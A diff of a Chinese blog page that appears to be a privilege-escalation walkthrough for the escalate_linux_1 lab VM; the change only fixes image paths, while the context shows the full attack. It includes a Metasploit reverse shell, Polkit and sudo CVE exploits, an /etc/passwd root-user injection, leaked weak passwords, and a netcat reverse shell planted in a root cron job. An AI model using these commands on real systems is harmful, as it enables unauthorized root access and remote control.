@@ -348,9 +348,9 @@ cmd可执行命令
 
 <p>访问后是Ubuntu默认页面</p>
 <p>目录扫描,存在shell.php</p>
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726366262278.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726366262278.jpg"></p>
 <p>cmd可执行命令</p>
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726366335040.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726366335040.jpg"></p>
 <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>正常弹shell命令不行，换msf弹</p>
 <p>使用exploit&#x2F;multi&#x2F;script&#x2F;web_delivery模块</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">search web_delivery
@@ -365,7 +365,7 @@ use exploit/multi/script/web_delivery</code></pre>
 <pre class="language-bash" data-language="bash"><code class="language-bash">run</code></pre>
 
 <p>将这段放在BP上url编码后反弹shell</p>
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726368942924.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726368942924.jpg"></p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><blockquote>
 <p>原理：</p>
 </blockquote>
@@ -422,17 +422,17 @@ f 表示常规文件，而不是目录或特殊文件
 <p>有个shell文件，直接执行就可以提权</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/user3 <span class="token operator">&amp;&amp;</span> ./shell</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726370865914.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726370865914.jpg"></p>
 <h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">检测工具</a></p>
 <pre class="language-none"><code class="language-none">wget http:&#x2F;&#x2F;192.168.235.1&#x2F;linux-exploit-suggester.sh</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726375663428.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726375663428.jpg"></p>
 <h2 id="Polkit-CVE-2021-4034-提权"><a href="#Polkit-CVE-2021-4034-提权" class="headerlink" title="Polkit(CVE-2021-4034)提权"></a>Polkit(CVE-2021-4034)提权</h2><pre class="language-none"><code class="language-none">wget http:&#x2F;&#x2F;192.168.235.1&#x2F;CVE-2021-4034-main.zip
 unzip CVE-2021-4034-main.zip &amp;&amp; cd CVE-2021-4034-main &amp;&amp; make &amp;&amp; .&#x2F;cve-2021-4034
 whoami
 ##  root  提权成功</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726376543136.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726376543136.jpg"></p>
 <h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><p>suid提权时还有一个自定义设置的&#x2F;home&#x2F;user5&#x2F;script</p>
 <p>执行结果</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">./script
@@ -457,7 +457,7 @@ echo $PATH   查看环境变量</code></pre>
 <span class="token function">whoami</span>
 <span class="token comment">## root  成功提权</span></code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726382340059.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726382340059.jpg"></p>
 <h2 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/exports
 <span class="token comment">## /home/user5 *(rw,no_root_squash)</span></code></pre>
 
@@ -486,12 +486,12 @@ chmod +s shell</code></pre>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/user5
 ./shell  成功提权</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726395441195.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726395441195.jpg"></p>
 <h2 id="Mysql数据泄露"><a href="#Mysql数据泄露" class="headerlink" title="Mysql数据泄露"></a>Mysql数据泄露</h2><p>Mysql密码为弱口令<code>root</code>，登录后在<code>user</code>库，<code>user_info</code>表下泄露了mysql用户的密码</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span> 启动一个更完整的shell环境才能使用Mysql
 mysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span></code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726398067090.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726398067090.jpg"></p>
 <p>在&#x2F;var下的mysql之前没有权限查看，现在用mysql用户查看</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /var/mysql
 <span class="token function">chmod</span> +x .user_informations
@@ -508,14 +508,14 @@ mysql <span class="token parameter variable">-u</span> root <span class="token p
 <pre class="language-none"><code class="language-none">find &#x2F; -user mysql 查看当前用户所属的文件
 root密码在 &#x2F;etc&#x2F;mysql&#x2F;secret.cnf里面，弱口令12345</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726398766520.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726398766520.jpg"></p>
 <h2 id="SUDO-CVE-2021-3156-提权-失败"><a href="#SUDO-CVE-2021-3156-提权-失败" class="headerlink" title="SUDO(CVE-2021-3156)提权(失败)"></a>SUDO(CVE-2021-3156)提权(失败)</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">--version</span>
 版本在
 <span class="token number">1.8</span>.2-1.8.31p2
 <span class="token number">1.9</span>.0-1.9.5p1之间
 sudoedit <span class="token parameter variable">-s</span> /</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726400810453.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726400810453.jpg"></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156">EXP</a></p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> CVE-2021-3156
 <span class="token function">make</span>
@@ -533,44 +533,44 @@ sudoedit <span class="token parameter variable">-s</span> /</code></pre>
 <span class="token function">sudo</span> <span class="token parameter variable">-l</span></code></pre>
 
 <p>vi命令可以不要密码直接以root权限进行操作</p>
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726400980627.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726400980627.jpg"></p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vi</span> aaa
 vi里面写入<span class="token operator">!</span>:sh
 运行这个命令后会进入一个 shell 环境，可以执行命令</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726401586660.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726401586660.jpg"></p>
 <blockquote>
 <p>user2用户</p>
 </blockquote>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> user2</code></pre>
 
 <p> <code>user2</code> 可以以 <code>user1</code> 的身份执行 所有 命令</p>
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726402120044.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726402120044.jpg"></p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> user1 /bin/bash</code></pre>
 
 <p>然后<code>user1</code>又可以以<code>root</code>用户的身份执行所有命令</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span></code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726402341853.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726402341853.jpg"></p>
 <p><code>user1</code>用户的密码也跟其他一个格式<code>user1@12345</code></p>
 <h2 id="文件权限问题导致提权"><a href="#文件权限问题导致提权" class="headerlink" title="文件权限问题导致提权"></a>文件权限问题导致提权</h2><p><code>user4</code>用户属于<code>root</code>组，而&#x2F;etc&#x2F;passwd同组可写</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /etc/passwd
 <span class="token builtin class-name">echo</span> <span class="token string">"jiqimer:<span class="token variable"><span class="token variable">$(</span>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> admin <span class="token number">123456</span><span class="token variable">)</span></span>:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd  
  <span class="token function">su</span> admin</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726404009665.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726404009665.jpg"></p>
 <h2 id="定时任务权限配置不当"><a href="#定时任务权限配置不当" class="headerlink" title="定时任务权限配置不当"></a>定时任务权限配置不当</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/crontab</code></pre>
 
 <p>&#x2F;home&#x2F;user4&#x2F;Desktop下的autoscript.sh有root权限</p>
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726404138727.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726404138727.jpg"></p>
 <p>切换到<code>user4</code>,修改里面的内容</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> user4
 <span class="token builtin class-name">cd</span> /home/user4/Desktop
 <span class="token builtin class-name">echo</span> <span class="token string">"rm f;mkfifo f;cat f|/bin/sh -i 2>&amp;1|nc 192.168.235.1 8080 > f"</span> <span class="token operator">></span> autoscript.sh</code></pre>
 
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726404826034.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726404826034.jpg"></p>
 <p>五分钟后就会弹shell过来</p>
-<p><img src="/%5Cimages%5Cposts%5CLinux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)%5C1726405046885.jpg"></p>
+<p><img src="/images/posts/Linux%E6%8F%90%E6%9D%83(escalate_linux_1%E9%9D%B6%E6%9C%BA)/1726405046885.jpg"></p>
 
                 
             </div>
@@ -966,7 +966,7 @@ vi里面写入<span class="token operator">!</span>:sh
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">50k</span>
+                        class="white-color">50.3k</span>
             
             
             
